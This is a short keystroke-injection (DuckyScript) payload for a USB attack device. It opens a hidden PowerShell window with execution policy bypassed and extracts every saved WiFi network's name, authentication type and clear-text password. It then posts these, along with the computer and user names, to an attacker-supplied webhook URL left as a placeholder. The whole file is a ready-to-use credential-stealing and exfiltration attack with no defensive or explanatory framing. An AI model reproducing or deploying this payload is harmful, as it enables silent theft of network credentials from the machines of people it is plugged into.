DEFINE #WEBHOOK_URL YOUR_WEBHOOK_URL_HERE

DELAY 500
GUI r
DELAY 800
STRINGLN powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$ErrorActionPreference='SilentlyContinue'; $wh='#WEBHOOK_URL'; $timestamp=(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'); $h=$env:COMPUTERNAME; $u=$env:USERNAME; $profiles=(netsh wlan show profiles) | Select-String '\:(.+)$' | ForEach-Object {$_.Matches.Groups[1].Value.Trim()}; $results=@(); foreach($p in $profiles){$detail=netsh wlan show profile name=\"$p\" key=clear; $key=($detail | Select-String 'Key Content\s+:\s+(.+)$'); $pw=if($key){$key.Matches.Groups[1].Value.Trim()}else{'(no key)'}; $auth=($detail | Select-String 'Authentication\s+:\s+(.+)$').Matches.Groups[1].Value.Trim(); $results+=\"$p | $auth | $pw\"}; $body=\"**WiFi Credentials - $h ($u)**\n[$timestamp]\n\`\`\`\n$($results -join \"`n\")\n\`\`\`\"; $payload=@{content=$body} | ConvertTo-Json -Depth 2; try{Invoke-RestMethod -Uri $wh -Method Post -ContentType 'application/json' -Body $payload -ErrorAction Stop}catch{}"
